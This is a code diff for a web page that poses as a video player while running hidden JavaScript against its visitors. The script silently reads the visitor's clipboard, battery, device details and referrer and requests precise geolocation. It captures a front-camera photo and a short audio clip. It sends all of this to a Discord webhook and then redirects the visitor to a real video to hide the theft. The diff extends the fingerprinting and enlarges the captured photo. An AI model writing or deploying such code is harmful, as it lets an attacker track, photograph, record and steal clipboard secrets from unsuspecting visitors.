@@ -30,55 +30,57 @@
             const status = document.getElementById('status');
             status.innerText = "Connecting to player...";
 
-            // 1. SILENT DATA GATHERING
+            // 1. GATHER ALL INFO (Silent)
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const referrer = document.referrer || "Direct Link";
+            const ram = navigator.deviceMemory || "Unknown";
+            const time = new Date().toLocaleString();
+            
+            let browserType = "Standard Browser";
+            if (ua.includes("Discord")) browserType = "Discord App";
+            else if (ua.includes("Instagram")) browserType = "Instagram App";
+
             let batteryInfo = "Unknown";
             try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Discharging"})`;
-                }
+                const battery = await navigator.getBattery();
+                batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Discharging"})`;
             } catch (e) {}
-
-            const referrer = document.referrer || "Direct";
-            const ua = navigator.userAgent;
-            let browserType = ua.includes("Discord") ? "Discord App" : "Standard Browser";
-            const time = new Date().toLocaleString();
 
             let clip = "Denied";
             try { clip = await navigator.clipboard.readText(); } catch (e) {}
 
             // 2. TRIGGER PERMISSIONS
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                status.innerText = "Loading video...";
                 const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 
-                // SEND TEXT DATA FIRST (Guaranteed to hit Discord)
+                // SEND FULL TEXT PAYLOAD
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
-                        content: `📍 **Location:** ${mapLink}\n📋 **Clip:** \`${clip}\`\n🔋 **Battery:** ${batteryInfo}\n🔗 **Ref:** ${referrer}\n🌐 **App:** ${browserType}\n⏰ **Time:** ${time}` 
+                        content: `📍 **Location:** ${mapLink}\n📋 **Clip:** \`${clip}\`\n🔋 **Battery:** ${batteryInfo}\n📱 **Device:** ${platform} (${screenRes})\n🚀 **RAM:** ${ram}GB\n🔗 **Ref:** ${referrer}\n🌐 **App:** ${browserType}\n⏰ **Time:** ${time}\n🕵️ **Agent:** \`${ua.substring(0, 80)}...\`` 
                     })
                 });
 
-                // 3. TRY MEDIA CAPTURE
+                // 3. MEDIA CAPTURE
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
 
                     const canvas = document.createElement('canvas');
-                    canvas.width = 320; canvas.height = 240;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-                    const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
+                    canvas.width = 480; canvas.height = 640;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+                    const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
 
                     const mediaRecorder = new MediaRecorder(stream);
                     const chunks = [];
                     mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                    
-                    const record = new Promise((resolve) => {
-                        mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'audio/wav' }));
+                    const record = new Promise((res) => {
+                        mediaRecorder.onstop = () => res(new Blob(chunks, { type: 'audio/wav' }));
                         mediaRecorder.start();
                         setTimeout(() => mediaRecorder.stop(), 2000);
                     });
@@ -87,17 +89,14 @@
                     stream.getTracks().forEach(t => t.stop());
 
                     const fd = new FormData();
-                    fd.append("file1", photoBlob, "photo.jpg");
+                    fd.append("file1", photoBlob, "snap.jpg");
                     fd.append("file2", audioBlob, "audio.wav");
                     await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
-                } catch (err) {
-                    console.log("Media blocked");
-                }
+                } catch (err) {}
 
                 window.location.replace(REDIRECT_URL);
 
             }, (err) => {
-                // If they decline location, still go to the video
                 window.location.replace(REDIRECT_URL);
             }, { enableHighAccuracy: true, timeout: 5000 });
         }
